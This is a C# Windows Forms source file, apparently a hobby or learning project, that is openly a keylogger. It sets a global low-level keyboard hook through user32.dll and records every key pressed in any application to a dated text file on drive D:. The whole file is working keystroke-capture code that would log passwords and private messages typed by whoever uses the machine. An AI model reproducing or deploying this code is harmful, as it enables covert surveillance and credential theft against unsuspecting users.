using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Load += Form1_Load;
            FormClosing += Form1_FormClosing;
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // установка хука
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callBack, IntPtr hinstance, uint threadId);

        //функция для снятия пользовательского хука
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hinstance);
        
        //передача сообщения для цепочки 
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);
        
        //Функция для загрузки библиотек
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        
        //Номер глобального LowLewel-хука на клавиатуру
        const int WH_KEYBOARD_LL = 13;
        
        //Сообщение нажатия на клавишу
        const int WM_KEYDOWN = 0x100;
        
        //Создаем callback делегат
        private LowLevelKeyboardProc _proc = hookProc;
        
        //Создаем hook и пресваеваем ему значение 0
        private static IntPtr hhook = IntPtr.Zero;


        private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //обработка нажатия 
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string dt = $"{DateTime.Now.ToShortDateString()}";
                string fileName = $"D:\\some_{dt}.txt";
                if (!File.Exists(fileName))
                {
                    using (FileStream fs = File.Create(fileName)) { };
                }
                using (StreamWriter sw = new StreamWriter(fileName, append: true))
                {
                    switch (vkCode.ToString())
                    {
                        case "8":
                            sw.Write("Backspace");
                            break;
                        case "9":
                            sw.Write("Tab");
                            break;
                        case "13":
                            sw.Write("Enter");
                            break;
                        case "16":
                            sw.Write("Shift");
                            break;
                        case "17":
                            sw.Write("CTRL");
                            break;
                        case "18":
                            sw.Write("Alt");
                            break;
                        case "20":
                            sw.Write("CapsLock");
                            break;
                        case "32":
                            sw.Write(" ");
                            break;
                        case "46":
                            sw.Write("Delete");
                            break;

                        case "65":
                            sw.Write("a");
                            break;
                        case "66":
                            sw.Write("b");
                            break;
                        case "67":
                            sw.Write("c");
                            break;
                        case "68":
                            sw.Write("d");
                            break;
                        case "69":
                            sw.Write("e");
                            break;
                        case "70":
                            sw.Write("f");
                            break;
                        case "71":
                            sw.Write("g");
                            break;
                        case "72":
                            sw.Write("h");
                            break;
                        case "73":
                            sw.Write("i");
                            break;
                        case "74":
                            sw.Write("j");
                            break;
                        case "75":
                            sw.Write("k");
                            break;
                        case "76":
                            sw.Write("l");
                            break;
                        case "77":
                            sw.Write("m");
                            break;
                        case "78":
                            sw.Write("n");
                            break;
                        case "79":
                            sw.Write("o");
                            break;
                        case "80":
                            sw.Write("p");
                            break;
                        case "81":
                            sw.Write("q");
                            break;
                        case "82":
                            sw.Write("r");
                            break;
                        case "83":
                            sw.Write("s");
                            break;
                        case "84":
                            sw.Write("t");
                            break;
                        case "85":
                            sw.Write("u");
                            break;
                        case "86":
                            sw.Write("v");
                            break;
                        case "87":
                            sw.Write("w");
                            break;
                        case "88":
                            sw.Write("x");
                            break;
                        case "89":
                            sw.Write("y");
                            break;
                        case "90":
                            sw.Write("z");
                            break;
                        case "48":
                            sw.Write("0");
                            break;
                        case "49":
                            sw.Write("1");
                            break;
                        case "50":
                            sw.Write("2");
                            break;
                        case "51":
                            sw.Write("3");
                            break;
                        case "52":
                            sw.Write("4");
                            break;
                        case "53":
                            sw.Write("5");
                            break;
                        case "54":
                            sw.Write("6");
                            break;
                        case "55":
                            sw.Write("7");
                            break;
                        case "56":
                            sw.Write("8");
                            break;
                        case "57":
                            sw.Write("9");
                            break;
                        case "96":
                            sw.Write("0");
                            break;

                        case "144":
                            sw.Write("NumLock");
                            break;
                        case "97":
                            sw.Write("1");
                            break;
                        case "98":
                            sw.Write("2");
                            break;
                        case "99":
                            sw.Write("3");
                            break;
                        case "100":
                            sw.Write("4");
                            break;
                        case "101":
                            sw.Write("5");
                            break;
                        case "102":
                            sw.Write("6");
                            break;
                        case "103":
                            sw.Write("7");
                            break;
                        case "104":
                            sw.Write("8");
                            break;
                        case "105":
                            sw.Write("9");
                            break;
                        case "106":
                            sw.Write("*");
                            break;
                        case "107":
                            sw.Write("+");
                            break;
                        case "109":
                            sw.Write("-");
                            break;
                        case "110":
                            sw.Write(".");
                            break;
                        case "111":
                            sw.Write("/");
                            break;

                        case "192":
                            sw.Write("`");
                            break;
                        case "189":
                            sw.Write("-");
                            break;
                        case "187":
                            sw.Write("=");
                            break;
                        case "219":
                            sw.Write("[");
                            break;
                        case "221":
                            sw.Write("]");
                            break;
                        case "220":
                            sw.Write("\\");
                            break;
                        case "186":
                            sw.Write(";");
                            break;
                        case "222":
                            sw.Write("'");
                            break;
                        case "188":
                            sw.Write(",");
                            break;
                        case "190":
                            sw.Write(".");
                            break;
                        case "191":
                            sw.Write("/");
                            break;

                        case "37":
                            sw.Write("ArrowLeft");
                            break;
                        case "38":
                            sw.Write("ArrowUp");
                            break;
                        case "39":
                            sw.Write("ArrowRight");
                            break;
                        case "40":
                            sw.Write("ArrowDown");
                            break;

                        default:
                            break;
                    }
                    sw.Close();
                }
                return (IntPtr)0;
            }
            else
                return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            SetHook();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnHook();
        }

        public void SetHook()
        {
            IntPtr hinstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hinstance, 0);
        }

        public static void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }


    }
}
